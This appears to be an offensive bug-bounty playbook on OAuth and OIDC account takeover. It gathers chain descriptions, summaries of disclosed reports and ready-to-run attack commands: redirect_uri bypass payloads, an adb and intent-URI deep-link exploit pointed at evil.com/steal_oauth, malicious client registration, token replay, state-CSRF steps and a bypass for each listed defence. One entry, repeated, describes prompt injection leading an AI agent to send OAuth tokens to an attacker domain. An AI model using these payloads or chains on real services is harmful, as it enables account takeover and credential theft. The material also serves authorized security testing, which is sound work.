- **`llm-ai`** — Modern OAuth flows for AI agents (ChatGPT plugins, Claude MCP servers, agentic copilots) reuse OAuth 2.1 + PKCE. Chain primitive: agentic AI accepts `redirect_uri` from indirect prompt-injection in a document → model crafts OAuth authorize URL with attacker callback → user clicks "approve" thinking it's the agent's own flow → tokens exfiltrated via tool-use to attacker domain.
- **`saml`** — When OAuth is layered atop a SAML IdP, the IdP-level XSW becomes the OAuth ATO path. Chain primitive: SAML SP that issues OAuth tokens after assertion-validation + XSW attack on the assertion alters `NameID` to admin user → SP issues OAuth token bearing admin identity → OAuth-scoped APIs grant admin access.
- **`security-arsenal`** — Pull the OAuth `redirect_uri` Bypass Table (host-confusion `legit.com@evil.com`, `legit.com.evil.com`, path-traversal, parameter pollution, encoded-slash `%2F`, fragment-injection `#legit.com`) and the open-redirect chain catalog when exact-match validation forces you to find an open-redirect on the whitelisted domain first.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an OAuth "open redirect" that doesn't actually leak a token (only the `state` param, or the callback page doesn't include credentials in URL). State-only leakage is Low; token/code leakage with successful exchange demonstration is Critical. The exchange-the-code step is non-negotiable.

### Related Skills & Chains

- **`hunt-subdomain`** — The single highest-impact OAuth chain. Chain primitive: OAuth `redirect_uri` validator accepts any `*.target.com` subdomain + recon reveals `dev-staging.target.com` CNAMEs to a deprovisioned Heroku/S3/Azure app → claim the dangling subdomain → host an OAuth callback receiver there → craft `/oauth/authorize?redirect_uri=https://dev-staging.target.com/cb` → victim clicks → auth code lands on attacker-claimed subdomain → exchange for token → ATO. The redirect_uri whitelist passed because the subdomain is "legitimately" under target.com control.
- **`hunt-ato`** — OAuth state-CSRF is the textbook ATO-via-account-linking primitive. Chain primitive: `state` parameter absent or not session-bound + victim is already logged into target.com + attacker initiates OAuth flow from their own account, captures `code` before exchange + crafts callback URL with attacker's code → forces victim to visit → victim's target.com session is now linked to attacker's Google/Facebook identity → attacker logs in via Google → owns victim's account.
- **`hunt-llm-ai`** — Modern OAuth flows for AI agents (ChatGPT plugins, Claude MCP servers, agentic copilots) reuse OAuth 2.1 + PKCE. Chain primitive: agentic AI accepts `redirect_uri` from indirect prompt-injection in a document → model crafts OAuth authorize URL with attacker callback → user clicks "approve" thinking it's the agent's own flow → tokens exfiltrated via tool-use to attacker domain.
- **`hunt-saml`** — When OAuth is layered atop a SAML IdP, the IdP-level XSW becomes the OAuth ATO path. Chain primitive: SAML SP that issues OAuth tokens after assertion-validation + XSW attack on the assertion alters `NameID` to admin user → SP issues OAuth token bearing admin identity → OAuth-scoped APIs grant admin access.
- **`security-arsenal`** — Pull the OAuth `redirect_uri` Bypass Table (host-confusion `legit.com@evil.com`, `legit.com.evil.com`, path-traversal, parameter pollution, encoded-slash `%2F`, fragment-injection `#legit.com`) and the open-redirect chain catalog when exact-match validation forces you to find an open-redirect on the whitelisted domain first.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an OAuth "open redirect" that doesn't actually leak a token (only the `state` param, or the callback page doesn't include credentials in URL). State-only leakage is Low; token/code leakage with successful exchange demonstration is Critical. The exchange-the-code step is non-negotiable.

## Tools and wordlists

### Tools

`Burp` · `oauth-misconfig` · `jwt_tool`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_oauth-oidc.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_oauth-oidc.txt` | 78 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_oauth-oidc.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_oauth-oidc.txt \
     -mr 'canary|error|invalid|not found' -rate 40
```

### Nuclei

Focus on redirect_uri validation, state/nonce, code reuse, and account linking — scanner coverage is shallow.

```sh
nuclei -u https://target -tags oauth,oidc \
       -severity low,medium,high,critical -rl 40 -o nuclei_oauth-oidc.txt
nuclei -u https://target -t ~/nuclei-templates/http/technologies/oauth2-detect.yaml \
       -rl 40 -o nuclei_oauth-oidc_oauth2-detect.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Grep Patterns for Recon

```bash
# In APK/JS files
grep -r "redirect_uri\|client_secret\|oauth_token\|access_token\|push_notification" .
grep -r "intent://\|deeplink\|scheme://" .

# In Burp history
# Filter: URL contains "oauth" OR "token" OR "callback"
# Filter: Response contains "access_token" OR "code=" in Location header

# Check .well-known
curl https://target.com/.well-known/openid-configuration | python3 -m json.tool
```

## Sources and related reading

### Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class oauth-oidc --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class oauth-oidc
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class oauth-oidc
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class oauth-oidc --min-bounty 1000
```

### Related

- `hackerone-auth-bypass` (989 reports)
- `hackerone-open-redirect` (385 reports)
- `hackerone-account-takeover` (262 reports)

### Related

- `auth-bypass` (989 reports)
- `open-redirect` (385 reports)
- `account-takeover` (262 reports)

### D. Sources — numbered list of URLs you actually fetched

1. https://portswigger.net/research/hidden-oauth-attack-vectors
2. https://hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html

## Additional notes

### Parameters observed

`client_id` · `redirect_uri` · `response_type` · `scope` · `code` · `state` · `oauth_token` · `referrer` · `client_secret` · `error` · `type` · `email` · `remember_me` · `ticket` · `jwt` · `next` · `settings_version` · `callback` · `requestTokenAndRedirect` · `sid`

### Shopify Stocky App OAuth Misconfiguration

`#740989` · Shopify · $0 · medium · 2019-12-11 · ▲527
> @vulnh0lic noticed that a staff member without Apps permission was able to access the Stocky app. We determined that this was because of a bug in Stocky's OAuth authentication code, which allowed the user to be granted access to Stocky at the start of the OAuth process rather than the end. This resulted in a full authentication bypass. Within an hour of validating the report, we deployed a fix for this vulnerability.

### Reflected XSS in OAUTH2 login flow

`#697099` · LY Corporation · $1,990 · medium · 2020-04-21 · ▲489
> The reporter found a reflected XSS in the OAUTH2 login flow which could have allowed potential attackers to steal credentials or hijack accounts by sending a message to the victim containing a malicious URL.

### [Urgent] Invalidating OAuth2 Bearer token makes TweetDeck unavailable

`#210779` · X / xAI · $0 · n/a · 2019-04-25 · ▲323
> I've noticed that TweetDeck is using OAuth2 to issue requests (Authorization Bearer token): According to the documentation, with a valid consumer key and consumer secret pair, one can generate or invalidate existing bearer token: https://dev.twitter.com/oauth/reference/post/oauth2/invalidate/token Now, it can be guessed that the hardcoded bearer token used in TweetDeck belongs to the TweetDeck client.

### URL Patterns to Hunt

```
/oauth/authorize
/oauth/token
/connect/authorize
/auth/callback
/oauth/callback
/login?redirect_uri=
/signin?next=
/auth?return_to=
/oauth/redirect
/push_notification_webview
```

### JavaScript Patterns (grep in JS bundles)

```javascript
redirect_uri
client_id
response_type=code
response_type=token
state=
nonce=
oauth_token
access_token
push_notification_webview
deeplink
intent://
```

### Scenario 1: Mobile Session Theft via Push Notification Deep Link (PayPal/Venmo pattern)

An attacker discovers that the Android app's push notification handler accepts an arbitrary `url` parameter in its deep link scheme without validating the host. The attacker crafts a malicious URL using the app's custom scheme pointing to their own server. When sent to a victim (via social engineering or a compromised push notification channel), the app opens a WebView navigating to the attacker's server — which then initiates an OAuth flow and captures the OAuth token as it's returned to the "callback" now under attacker control. Result: full account takeover on a payments platform affecting millions of users. Business impact: unauthorized fund transfers, exposure of linked payment methods and transaction history.

### Scenario 3: OAuth Token Theft via Referrer Header on Language Change (Rockstar Games pattern)

The OAuth callback page for Facebook login lands users at a URL containing the `access_token` in the query string. The page includes a language-switcher widget that makes a GET request to change locale preferences. This GET request includes the full page URL as a `Referer` header — containing the Facebook access token. An attacker who can read server logs (or who compromises the language-change endpoint, or who is a malicious advertiser with pixel access) harvests Facebook OAuth tokens from Referer logs. Result: the attacker can authenticate to the victim's Facebook account and any other service accepting that Facebook token, constituting a cross-platform account takeover. Business impact: GDPR/privacy violation, cross-service account compromise, potential regulatory liability.

---

### Disclosed Report Citations (Backfill +9 — 2020-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill beyond the original 10 internal references. Each is a distinct OAuth subclass with a working PoC documented in the cited writeup.

11. **Semrush — IDN-homograph redirect_uri bypass** ([H1 #861940](https://hackerone.com/reports/861940))
    - Subclass: `redirect_uri` bypass via Unicode-confusable host (homograph)
    - Payload: `redirect_uri=https://oauth.šemrush.com/cb` (punycode `xn--emrush-9jb.com`) — passed Latin-only string check on validator
    - Root cause: server validates `redirect_uri` host as ASCII-string equality but does not normalize Unicode → confusables → punycode before compare
    - Disclosure: 2020, public bounty (amount not disclosed); discoverer Yassine Aboukir

12. **Bohemia Interactive — redirect_uri filter bypass (BiStudio)** ([H1 #405100](https://hackerone.com/reports/405100))
    - Subclass: `redirect_uri` validation bypass → OAuth token exfiltration
    - Payload: redirect_uri crafted to defeat the regex/prefix filter and land tokens on attacker host; reporter chained the bypass to a full token-leak PoC
    - Root cause: weak redirect_uri filter that accepted attacker-controlled host while still matching the intended pattern
    - Year: 2018-disclosed; remains a canonical example of regex-redirect_uri-bypass cited in subsequent reports

13. **pixiv — path-traversal in OAuth `redirect_uri`** ([H1 #1861974](https://hackerone.com/reports/1861974))
    - Subclass: path-traversal `redirect_uri` bypass → authorization-code leakage
    - Payload: `redirect_uri=https://legit.pixiv.host/legit/../../attacker/cb` — server normalized after validation
    - Root cause: validator inspected raw string; downstream HTTP/browser handled `../` traversal and emitted code to attacker path
    - Disclosure: 2023, **$2,000 bounty**, 244 upvotes — confirmed paid

14. **Slack — OAuth2 redirect_uri bypass (domain-suffix)** ([H1 #2575](https://hackerone.com/reports/2575))
    - Subclass: `redirect_uri` validation bypass via domain-suffix / subdomain confusion
    - Payload: redirect_uri using a domain that suffix-matched the registered host (e.g., `slack.com.attacker.com`) defeated the suffix-only check
    - Root cause: `endsWith()` / suffix-match instead of strict host equality
    - Disclosure: 2013 (foundational case still cited in modern OAuth training material) — Slack public bounty

15. **Booking.com (Facebook social-login)** ([Salt Labs writeup](https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com))
    - Subclass: three-step chain — open-redirect on whitelisted domain + redirect_uri bypass + `response_type` swap → Facebook OAuth code/token theft → ATO
    - Payload: authorize URL with `redirect_uri=https://account.booking.com/<open-redirect>?next=https://attacker.tld/cb` and `response_type` toggled to leak tokens via fragment
    - Root cause: validator trusted any path under `account.booking.com`; open redirect on that host bounced the auth code to attacker
    - Disclosure: March 2023 — coordinated disclosure, no public bounty figure (~500M MAU exposure)

16. **Expo.io (`expo-auth-session`) — CVE-2023-28131** ([Salt Labs writeup](https://salt.security/blog/a-new-oauth-vulnerability-that-may-impact-hundreds-of-online-services))
    - Subclass: scope-creep / unvalidated `returnUrl` parameter → cross-app OAuth-code theft (impacts every consumer of expo-auth-session social login)
    - Payload: attacker passes `returnUrl=https://attacker.tld` to the OAuth proxy → Expo blindly forwards Facebook/Google/Apple/Twitter code to attacker
    - Root cause: framework-level OAuth proxy did not validate `returnUrl` host before forwarding the social-IdP callback
    - Disclosure: May 2023; CVSS 9.6; fixed Feb 2023 hotfix + deprecated by Feb 26 2023

17. **Microsoft Azure AD multi-tenant — "nOAuth"** ([Descope writeup](https://www.descope.com/blog/post/noauth))
    - Subclass: cross-IdP account-takeover via unverified, mutable `email` claim ("Pass-The-Token" equivalent)
    - Payload: attacker sets Azure AD admin profile `mail` attribute to victim's address → clicks "Log in with Microsoft" on relying party that keys users by email claim → instant ATO
    - Root cause: Microsoft `email` claim is mutable + unverified; RPs treated it as primary identifier
    - Disclosure: April 11 2023 reported, fixed June 20 2023 (mitigations + new `xms_edov` claim)

18. **Grammarly / Vidio / Bukalapak — "Pass-The-Token" social-login** ([Salt Labs writeup](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts))
    - Subclass: missing audience / `aud` validation on Facebook access_token → cross-client token replay → ATO
    - Payload: attacker obtains Facebook token issued for `attacker.app` → replays the token to Grammarly/Vidio/Bukalapak login API → server fetches FB user via `/me`, finds victim's email, issues victim session
    - Root cause: relying party calls Facebook `/me` with attacker-issued token but never validates the token's `app_id` belongs to the RP
    - Disclosure: October 2023 — coordinated, ~1B account exposure across the three sites

19. **Zoom — OAuth "dirty dancing" chained ATO** ([Harel Security writeup](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html))
    - Subclass: `response_type=token` swap + lax `postMessage` origin check + cookie-tossing → authorization-code leak via web_message response mode → ATO + cam/mic hijack
    - Payload: attacker page opens Zoom OAuth with `response_type=code&response_mode=web_message`, intercepts the resulting `postMessage` because window listener accepts any `*.zoom.us` origin → exchanges code for session
    - Root cause: combination of weak postMessage origin check, missing CSRF binding on `state`, and `response_mode=web_message` returning code to a parent window without exact-origin enforcement
    - Disclosure: reported Oct 2023, fixed Jan 2024, **$15,000 bounty** (Sudi / BrunoZero / H4R3L)

20. **Detectify Labs — "Dirty Dancing" multi-vendor OAuth token leakage** ([Detectify writeup, F. Rosén](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/))
    - Subclass: response-type switching + invalid-state quirks + 3rd-party JS gadget chains → OAuth code/token leakage with NO XSS required
    - Payload: attacker forces `response_type=token` on an endpoint that only validated `code`; combines with promiscuous postMessage listeners and URL-storage gadgets on the callback page to siphon tokens via cross-origin reads
    - Root cause: OAuth server tolerates response_type downgrade/swap; callback page leaks `window.location` via permissive postMessage receivers
    - Disclosure: July 2022 — multi-vendor (Apple, Microsoft, Slack et al.); PortSwigger Top 10 Web Hacks 2022 #1

---

### State CSRF Test

```bash
# Step 1: Initiate OAuth flow, capture state value
# Step 2: Drop request, use attacker account's link with victim's session
curl -v "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/cb&response_type=code&state=FIXED_VALUE"

# Step 3: Force victim to visit callback with attacker's code + fixed state
https://target.com/oauth/callback?code=ATTACKER_CODE&state=FIXED_VALUE
```

### Nonce Extraction via Referrer

```bash
# After OAuth callback landing page, check outbound requests
# Look for Referer header containing access_token or code
curl -v "https://target.com/auth/callback?code=ABC&state=XYZ" \
  -H "Referer: https://evil.com" \
  --max-redirs 0

# Grep JS for outbound calls made on callback page
grep -r "fetch\|XMLHttpRequest\|img.src\|script.src" callback_page.html
```

### Mobile Deep Link Exploit (Android)

```bash
# ADB exploit for push_notification_webview deeplink
adb shell am start -a android.intent.action.VIEW \
  -d "target-app://push_notification_webview?url=https://evil.com/steal_oauth"

# Craft intent URI for web-based exploit
<a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>
```

### OIDC Discovery & Dynamic Registration Abuse

```bash
# Enumerate OIDC endpoints (esp. registration_endpoint)
curl -s https://idp/.well-known/openid-configuration | jq '{authorization_endpoint, token_endpoint, jwks_uri, registration_endpoint, response_types_supported}'

# If registration_endpoint is open, register a malicious client with attacker redirect_uri
curl -X POST https://idp/connect/register \
  -H "Content-Type: application/json" \
  -d '{"client_name":"legit-app","redirect_uris":["https://attacker/cb"]}'
```

### Cross-Client Token Confusion

```bash
# Mint token for client A, attempt replay on client B's API
TOKEN=$(curl -s https://idp/oauth/token \
  -d "code=$AUTH_CODE&client_id=CLIENT_A&client_secret=SECRET_A&redirect_uri=https://app-a.com/cb" | jq -r .access_token)

# Test if client B's API accepts the token (no audience validation)
curl https://api.app-b.com/admin -H "Authorization: Bearer $TOKEN"
```

### OIDC prompt=none Silent Re-Auth Test

```bash
# Test whether adding prompt=none to authorize request yields a token without user interaction
# Signals session fixation / silent auth abuse potential
curl -v "https://idp/authorize?client_id=APP&redirect_uri=https://app/cb&response_type=code&state=XYZ&prompt=none"
```

---

### Defender: Exact-match `redirect_uri` whitelist

**Bypass:** Find an open redirect on the whitelisted domain itself, then use that URL as the redirect_uri. The OAuth server validates the registered domain ✓, but the open redirect bounces the code/token to attacker.
```
redirect_uri=https://legit.com/logout?next=https://evil.com
```

### Defender: `state` parameter required

**Bypass:** Check if state is validated for *length/format* but not *binding to session*. Use a fixed predictable state value. Also check if PKCE is enforced — if not, the state check alone is insufficient for code injection.

### Defender: Fragment-only token delivery (`response_type=token`)

**Bypass:** Fragment isn't sent in `Referer` by browsers, but JavaScript on the callback page may read `window.location.hash` and pass it to analytics or postMessage to a parent frame. Intercept postMessage handlers.

### Defender: Short-lived authorization codes

**Bypass:** Referrer leakage and open redirects work even with short-lived codes if the attacker has a fast receiver. For CSRF, the victim completes the flow so timing is less critical.

### Defender: PKCE enforcement

**Bypass:** Check if PKCE is required for *all* clients or only specific ones. Legacy clients or mobile apps may be exempt. Test with `code_challenge` omitted — if the server still issues tokens, PKCE isn't enforced.
